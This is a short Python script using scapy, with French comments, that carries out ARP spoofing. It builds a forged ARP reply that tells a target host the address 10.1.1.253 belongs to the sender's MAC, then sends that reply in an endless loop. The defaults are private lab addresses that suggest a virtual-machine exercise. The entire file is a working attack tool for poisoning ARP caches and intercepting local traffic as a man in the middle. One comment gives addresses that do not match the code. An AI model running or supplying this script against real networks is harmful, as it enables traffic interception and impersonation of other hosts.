from scapy.all import *
import argparse

# Valeurs par défaut
default_my_MAC = "52:54:00:2d:8b:c8"
default_target_IP = "10.1.1.101"
default_target_MAC = "52:54:00:7b:ae:9d"
default_spoofed_IP = "10.1.1.253"

# Configuration de l'analyseur d'arguments
parser = argparse.ArgumentParser(description="Script avec des variables configurables.")
parser.add_argument('--my-MAC', type=str, default=default_my_MAC, help="Votre adresse MAC (par défaut: 52:54:00:2d:8b:c8)")
parser.add_argument('--target-IP', type=str, default=default_target_IP, help="Adresse IP cible (par défaut: 10.1.1.101)")
parser.add_argument('--target-MAC', type=str, default=default_target_MAC, help="Adresse MAC cible (par défaut: 52:54:00:7b:ae:9d)")
parser.add_argument('--spoofed-IP', type=str, default=default_spoofed_IP, help="Adresse IP usurpée (par défaut: 10.1.1.253)")

# Analyse des arguments de la ligne de commande
args = parser.parse_args()

# Utilisation des valeurs fournies ou des valeurs par défaut
my_MAC = args.my_MAC
target_IP = args.target_IP
target_MAC = args.target_MAC
spoofed_IP = args.spoofed_IP

#conf.iface = 'virbr1' # !!sur le PC!! Car sinon il balance les trames dans la mauvaise interface :)

# on craft une trame : MAC src et MAC dst
frame = Ether(src=my_MAC, dst=target_MAC)

# Requête ARP qui dis : Yo 10.1.1.100, c'est 10.1.1.253 et mon address MAC c'est 66:66:66:66:66:66
arp = ARP(op=2, psrc=spoofed_IP,hwsrc=my_MAC, pdst=target_IP, hwdst=target_MAC)
final_frame = frame/arp


while True:
    sendp(final_frame, verbose=False)